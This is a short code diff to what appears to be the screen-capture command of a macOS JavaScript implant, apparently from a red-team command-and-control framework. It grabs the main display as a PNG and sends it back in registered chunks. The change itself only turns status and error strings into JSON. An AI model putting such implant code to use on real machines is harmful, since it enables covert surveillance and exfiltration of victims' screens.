@@ -4,7 +4,7 @@ exports.screencapture = function(task, command, params){
         ObjC.import('AppKit');
         var cgimage = $.CGDisplayCreateImage($.CGMainDisplayID());
         if(cgimage.js == undefined){
-          return "Failed to get image from display";
+          return JSON.stringify({"task": "error", "error":"Failed to get image from display"});
         }
         var bitmapimagerep = $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);
         var capture = bitmapimagerep.representationUsingTypeProperties($.NSBitmapImageFileTypePNG, Ref());
@@ -33,14 +33,14 @@ exports.screencapture = function(task, command, params){
                 var data = capture.subdataWithRange($.NSMakeRange(offset, csize));
                 currentChunk += 1;
             }
-            var output = "Finished downloading file with id: " + registerFile['file_id'];
+            var output = JSON.stringify({"task": "finished", "file_id": registerFile['file_id']});
         }
         else{
-           var output = "Failed to register file to download";
+           var output = JSON.stringify({"task": "error", "error":"Failed to register file to download"});;
         }
         return output;
     }catch(error){
-        return "Failed to get a screencapture: " + error.toString();
+        return JSON.stringify({"task": "error", "error":"Failed to get a screencapture: " + error.toString()});
     }
 };
 COMMAND_ENDS_HERE
